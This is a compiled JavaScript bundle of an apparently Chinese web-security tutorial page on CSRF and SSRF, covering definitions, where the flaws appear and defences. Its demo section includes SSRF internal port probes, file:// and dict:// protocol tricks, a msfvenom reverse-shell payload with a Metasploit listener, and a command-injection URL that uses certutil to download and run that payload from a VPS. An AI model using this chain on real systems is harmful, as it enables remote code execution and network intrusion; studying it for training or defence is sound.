(window.webpackJsonp=window.webpackJsonp||[]).push([[45],{370:function(t,s,r){"use strict";r.r(s);var v=r(3),_=Object(v.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("p",[t._v("[TOC]")]),t._v(" "),s("h1",{attrs:{id:"web攻防-csrf-ssrf-协议玩法-通用漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#web攻防-csrf-ssrf-协议玩法-通用漏洞"}},[t._v("#")]),t._v(" web攻防——csrf&SSRF&协议玩法&通用漏洞")]),t._v(" "),s("h2",{attrs:{id:"csrf"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#csrf"}},[t._v("#")]),t._v(" CSRF")]),t._v(" "),s("h5",{attrs:{id:"知识点"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#知识点"}},[t._v("#")]),t._v(" 知识点")]),t._v(" "),s("blockquote",[s("p",[t._v("CSRF全称：Cross-site request forgery，即，跨站请求伪造，也被称为 “One Click Attack” 或 “Session Riding”，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。举个生活中的例子：就是某个人点了个奇怪的链接，自己什么也没输，但自己的qq号或其他的号就被盗了。即该攻击可以在受害者不知情的情况下以受害者名义伪造请求，执行恶意操作，具有很大的危害性。")])]),t._v(" "),s("h3",{attrs:{id:"csrf攻击条件"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#csrf攻击条件"}},[t._v("#")]),t._v(" CSRF攻击条件")]),t._v(" "),s("ol",[s("li",[t._v("目标用户已经登录了网站，能够执行网站的功能。")]),t._v(" "),s("li",[t._v("目标用户访问了攻击者构造的URL。")])]),t._v(" "),s("h3",{attrs:{id:"csrf安全问题黑盒怎么判断-三看"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#csrf安全问题黑盒怎么判断-三看"}},[t._v("#")]),t._v(" CSRF安全问题黑盒怎么判断（三看）：")]),t._v(" "),s("ol",[s("li",[s("p",[t._v("看验证来源不-修复")]),t._v(" "),s("blockquote",[s("p",[t._v("同源策略，referer里面的地址是否从同一个地址发送的包，但能伪造，只能防御部分攻击。")])])]),t._v(" "),s("li",[s("p",[t._v("看凭据有无token--修复")]),t._v(" "),s("blockquote",[s("p",[t._v("一般网站里面有token能防御csrf攻击，每个网页上的操作都需要验证token值。")])])]),t._v(" "),s("li",[s("p",[t._v("看关键操作有无验证-修复")])])]),t._v(" "),s("h2",{attrs:{id:"ssrf"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#ssrf"}},[t._v("#")]),t._v(" SSRF")]),t._v(" "),s("h5",{attrs:{id:"知识点-2"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#知识点-2"}},[t._v("#")]),t._v(" 知识点")]),t._v(" "),s("blockquote",[s("p",[t._v("SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。")])]),t._v(" "),s("p",[s("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/01.png",alt:"01"}})]),t._v(" "),s("h3",{attrs:{id:"ssrf黑盒可能出现的地方"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#ssrf黑盒可能出现的地方"}},[t._v("#")]),t._v(" SSRF黑盒可能出现的地方：")]),t._v(" "),s("ol",[s("li",[s("p",[s("strong",[t._v("社交分享功能")]),t._v("：获取超链接的标题等内容进行显示")])]),t._v(" "),s("li",[s("p",[s("strong",[t._v("转码服务")]),t._v("：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览")])]),t._v(" "),s("li",[s("p",[s("strong",[t._v("在线翻译")]),t._v("：给网址翻译对应网页的内容")])]),t._v(" "),s("li",[s("p",[s("strong",[t._v("图片加载/下载")]),t._v("：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片")])]),t._v(" "),s("li",[s("p",[s("strong",[t._v("图片/文章收藏功能")]),t._v("：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验")])]),t._v(" "),s("li",[s("p",[s("strong",[t._v("云服务厂商")]),t._v("：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试")])]),t._v(" "),s("li",[s("p",[s("strong",[t._v("网站采集")]),t._v("，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作")])]),t._v(" "),s("li",[s("p",[s("strong",[t._v("数据库内置功能")]),t._v("：数据库的比如mongodb的copyDatabase函数")])]),t._v(" "),s("li",[s("p",[s("strong",[t._v("邮件系统")]),t._v("：比如接收邮件服务器地址")])]),t._v(" "),s("li",[s("p",[s("strong",[t._v("编码处理, 属性信息处理，文件处理")]),t._v("：比如ffpmg，ImageMagick，docx，pdf，xml处理器等")])]),t._v(" "),s("li",[s("p",[s("strong",[t._v("未公开的api实现以及其他扩展调用URL的功能")]),t._v("：可以利用google 语法加上这些关键字去寻找SSRF漏洞")])]),t._v(" "),s("li",[s("p",[s("strong",[t._v("一些的url中的关键字")]),t._v("：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……")])]),t._v(" "),s("li",[s("p",[s("strong",[t._v("从远程服务器请求资源")]),t._v("（upload from url 如discuz！；import & expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）")]),t._v(" "),s("p",[s("strong",[t._v("核心点：该功能点能去请求网址，或请求一些资源的就可能存在SSRF")])])])]),t._v(" "),s("h3",{attrs:{id:"ssrf的挖掘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#ssrf的挖掘"}},[t._v("#")]),t._v(" SSRF的挖掘")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/001.png",alt:"001"}})]),t._v(" "),s("h5",{attrs:{id:"ssrf白盒可能出现的地方"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#ssrf白盒可能出现的地方"}},[t._v("#")]),t._v(" SSRF白盒可能出现的地方：")]),t._v(" "),s("ol",[s("li",[t._v("功能点抓包指向代码块审计")]),t._v(" "),s("li",[t._v("功能点函数定位代码块审计")])]),t._v(" "),s("h5",{attrs:{id:"ssrf常见安全修复防御方案"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#ssrf常见安全修复防御方案"}},[t._v("#")]),t._v(" SSRF常见安全修复防御方案：")]),t._v(" "),s("ol",[s("li",[t._v("禁用跳转")]),t._v(" "),s("li",[t._v("禁用不需要的协议")]),t._v(" "),s("li",[t._v("固定或限制资源地址")]),t._v(" "),s("li",[t._v("错误信息统一信息处理")])]),t._v(" "),s("h5",{attrs:{id:"演示案例"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#演示案例"}},[t._v("#")]),t._v(" 演示案例")]),t._v(" "),s("p",[s("strong",[t._v("参考文章")]),t._v("：https://www.t00ls.cc/articles-41070.html")]),t._v(" "),s("p",[s("strong",[t._v("案例说明")]),t._v("：在本地创建了远程图片文件加载应用，直接被攻击者利用SSRF探针本地及内网服务，并利用某漏洞直接获取到内网某主机的权限！")]),t._v(" "),s("ol",[s("li",[t._v("服务探针（用bp爆破其内网机器或端口）：")])]),t._v(" "),s("p",[t._v("http://127.0.0.1:8081/")]),t._v(" "),s("p",[t._v("http://127.0.0.1:3306/")]),t._v(" "),s("ol",{attrs:{start:"2"}},[s("li",[t._v("协议玩法：（更多玩法见下图）")])]),t._v(" "),s("p",[t._v("file:///D:/www.txt")]),t._v(" "),s("p",[t._v("dict://127.0.0.1:3306/info")]),t._v(" "),s("p",[t._v("ftp://192.168.46.148:21")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/0.png",alt:"0"}})]),t._v(" "),s("ol",{attrs:{start:"3"}},[s("li",[s("p",[t._v("内网扫描：")]),t._v(" "),s("blockquote",[s("p",[t._v("扫描到有以下这个网址是存活的")]),t._v(" "),s("p",[t._v("http://192.168.46.148:8080")])]),t._v(" "),s("p",[t._v("漏洞利用：")])])]),t._v(" "),s("p",[s("strong",[t._v("生成")]),t._v("：")]),t._v(" "),s("blockquote",[s("p",[t._v("msfvenom -p windows/meterpreter/reverse_http LHOST=vps的ip地址 LPORT=6688 -f exe -o xx.exe")])]),t._v(" "),s("p",[s("em",[t._v("监听")]),t._v("：")]),t._v(" "),s("blockquote",[s("p",[t._v("use exploit/multi/handler\nset payload windows/meterpreter/reverse_http\nset lhost 0.0.0.0\nset lport 6688\nrun")])]),t._v(" "),s("p",[s("em",[t._v("下载")]),t._v("：")]),t._v(" "),s("blockquote",[s("p",[t._v("http://192.168.46.148:8080/?search==%00{.exec|cmd.exe%20/c%20certutil%20-urlcache%20-split%20-f%20http://vps的ip地址/xx.exe.}")])]),t._v(" "),s("p",[s("em",[t._v("执行")]),t._v("：")]),t._v(" "),s("blockquote",[s("p",[t._v("http://192.168.46.148:8080/?search==%00{.exec|xx.exe.}")])])])}),[],!1,null,null,null);s.default=_.exports}}]);